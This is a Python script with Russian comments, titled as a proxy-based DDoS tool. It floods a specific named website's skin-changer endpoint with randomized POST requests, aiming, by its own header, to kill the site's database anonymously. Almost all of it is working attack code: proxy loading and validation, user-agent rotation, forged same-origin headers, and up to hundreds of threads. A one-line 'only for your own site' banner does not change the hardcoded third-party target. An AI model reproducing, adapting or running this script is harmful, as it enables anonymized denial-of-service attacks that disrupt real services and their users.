# SKINCHANGER_PROXY_DDOS.py
# ТОЧНЫЙ POST-ФЛУД С ПРОКСИ НА resand.online/skins/
# БД УМРЁТ ОТ UPDATE | АНОНИМНО

import requests
import threading
import random
import time
import sys
from colorama import Fore, Style, init
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

# ================== НАСТРОЙКИ ==================
URL = "https://resand.online/skins/"
PROXY_FILE = "working_proxies.txt"  # socks5/http
NUM_THREADS = 100
DURATION = 60
DELAY = 0.05
CHECK_IP_URL = "https://api.ipify.org"
TIMEOUT = 8
# ===============================================

# Оружия (weapon_index)
WEAPONS = [1,2,3,4,7,8,9,10,11,13,14,16,17,19,23,24,25,26,27,28,29,30,31,32,33,34,35,36,38,39,40,60,61,63,64]

ua = UserAgent()
valid_proxies = []
stop_flag = False
total_requests = 0
lock = threading.Lock()

# ================== ЛОГИ ==================
def log(msg, color=Fore.CYAN):
    print(f"{color}{msg}{Style.RESET_ALL}")

# ================== ЗАГРУЗКА ПРОКСИ ==================
def load_proxies():
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        log(f"Загружено {len(proxies)} прокси из {PROXY_FILE}")
        return proxies
    except:
        log(f"Файл {PROXY_FILE} не найден! Работаем БЕЗ ПРОКСИ.", Fore.RED)
        return []

# ================== ПРОВЕРКА ПРОКСИ ==================
def check_proxy(proxy):
    proxies = {'http': proxy, 'https': proxy}
    try:
        r = requests.get(CHECK_IP_URL, proxies=proxies, timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            return proxy, True, r.text.strip()
        return proxy, False, None
    except:
        return proxy, False, None

def validate_proxies():
    global valid_proxies
    raw = load_proxies()
    if not raw:
        return
    
    log(f"Проверка {len(raw)} прокси...")
    working = []
    with ThreadPoolExecutor(max_workers=30) as executor:
        for proxy, ok, ip in executor.map(check_proxy, raw):
            if ok:
                working.append(proxy)
                log(f"РАБОЧИЙ: {proxy} → {ip}", Fore.GREEN)
            else:
                log(f"МЁРТВЫЙ: {proxy}", Fore.RED)
    
    valid_proxies = working
    if not valid_proxies:
        log("НИ ОДИН ПРОКСИ НЕ РАБОТАЕТ! Выход.", Fore.RED)
        sys.exit(1)
    log(f"ГОТОВО: {len(valid_proxies)} живых прокси")

# ================== РАНДОМНЫЙ POST ==================
def generate_post_data():
    return {
        "SkinChangerUpdate": "true",
        "id_team": str(random.choice([0, 2, 3])),
        "id_server": str(random.choice([1, 5, 10, 15, 20])),
        "weapon_index": str(random.choice(WEAPONS)),
        "id_skin": str(random.randint(1, 1000))
    }

# ================== АТАКА С ПРОКСИ ==================
def attack():
    global total_requests
    session = requests.Session()
    proxy = None
    
    while not stop_flag:
        # Ротация прокси
        if valid_proxies:
            proxy = random.choice(valid_proxies)
            session.proxies.update({'http': proxy, 'https': proxy})
        else:
            session.proxies.clear()
        
        data = generate_post_data()
        headers = {
            'User-Agent': ua.random,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://resand.online',
            'Referer': 'https://resand.online/skins/',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }
        
        try:
            response = session.post(URL, data=data, headers=headers, timeout=5)
            with lock:
                total_requests += 1
            status = response.status_code
            proxy_ip = proxy.split('@')[-1].split(':')[0] if proxy else "ПРЯМОЙ"
            
            if status in (200, 201):
                log(f"СКИН → {proxy_ip} | {data['weapon_index']}-{data['id_skin']} | {status}", Fore.GREEN)
            else:
                log(f"ОТВЕТ → {proxy_ip} | {status}", Fore.YELLOW)
        except:
            if valid_proxies:
                valid_proxies.remove(proxy)  # Удаляем мёртвый
            log(f"ОШИБКА → {proxy_ip if proxy else 'ПРЯМОЙ'}", Fore.RED)
        
        time.sleep(DELAY)

# ================== СТАТИСТИКА ==================
def print_stats():
    start = time.time()
    while not stop_flag:
        time.sleep(3)
        elapsed = time.time() - start
        rps = total_requests / elapsed if elapsed > 0 else 0
        log(f"RPS: {rps:,.0f} | Всего: {total_requests:,} | Прокси: {len(valid_proxies)}", Fore.CYAN)

# ================== ОСНОВНОЙ ЗАПУСК ==================
def main():
    global stop_flag, NUM_THREADS, DURATION, DELAY
    
    print(f"{Fore.RED}SKINCHANGER PROXY DDoS")
    print(f"{Fore.YELLOW}ТОЛЬКО ДЛЯ ТВОЕГО САЙТА!{Style.RESET_ALL}")
    
    validate_proxies()  # ← Проверка прокси
    
    try:
        NUM_THREADS = int(input(f"{Fore.CYAN}Потоков (50-200): {Style.RESET_ALL}") or "100")
        DURATION = int(input(f"{Fore.CYAN}Секунд: {Style.RESET_ALL}") or "60")
    except:
        pass
    
    log(f"ЗАПУСК: {NUM_THREADS} потоков → {URL}")
    log(f"RPS: ~{NUM_THREADS / DELAY:,.0f} | Прокси: {len(valid_proxies)}")
    print("Ctrl+C — остановить\n")
    time.sleep(2)
    
    threading.Thread(target=print_stats, daemon=True).start()
    
    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
        threads.append(t)
    
    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        pass
    finally:
        stop_flag = True
        log(f"ОСТАНОВЛЕНО. Отправлено {total_requests:,} POST-запросов через {len(valid_proxies)} прокси.", Fore.RED)

if __name__ == "__main__":
    main()